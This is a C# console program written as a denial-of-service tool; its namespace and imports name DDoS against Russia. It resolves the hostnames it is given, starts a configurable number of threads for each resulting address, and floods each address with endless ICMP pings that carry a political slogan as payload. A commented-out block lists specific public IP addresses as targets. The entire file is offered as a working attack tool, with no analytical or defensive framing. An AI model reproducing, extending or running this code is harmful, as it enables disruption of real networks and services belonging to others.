using System;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using KillRussia2WithDdos;

namespace HttpIdeadDdosProgram
{
    class Program
    {
        static List<string> ipaddresses = new();
        static void Main(string[] args)
        {
            //args = new string[]
            //{"3",
            //"80.68.247.26",
            //"195.218.193.151",
            //"5.255.255.70",
            //"5.255.255.77",
            //"77.88.55.60",
            //"77.88.55.88",
            //"195.218.193.151" };
            int threads = int.Parse(args[0]);

            for (int i = 1; i < args.Length; i++)
            {
                foreach (var item in FindIp.FindIpAddresses(args[i]))
                {
                    ipaddresses.Add(item.ToString());
                }
            }
            foreach (var item in ipaddresses)
            {
                //Console.WriteLine(item);
                DdosManager.Launch(threads,ipaddresses);
            }

            Console.ReadKey();
            DdosManager.AbortThreads();
        }
    }
    class DdosManager
    {
        public static List<Thread> list=new();
        public static void Launch(int threads, List<string> ips)
        {
            try
            {
                foreach (var item in ips)
                {
                    for (int i = 0; i < threads; i++)
                    {
                        list.Add(new Thread(async () => await new DdosGoAhead().SendRequest(item)));
                    }
                }
                LaunchThreads();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        public static void LaunchThreads()
        {
            list.ForEach(x=>x.Start());
        }
        public static void AbortThreads()
        {
            list.ForEach(x => x.Abort());
        }
    }
    class DdosGoAhead
    {
        public static long numerator = default;
        public async Task SendRequest(string ip)
        {
            try
            {
                while (true)
                {
                    Ping ping = new();
                    PingOptions options = new PingOptions(10, true);
                    byte[] data = Encoding.ASCII.GetBytes("Russkiy korabl didi nahui");
                    PingReply reply = await ping.SendPingAsync(ip, 30, data, options);
                    Console.WriteLine(ip + " Status-> " + reply.Status);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
    }
}
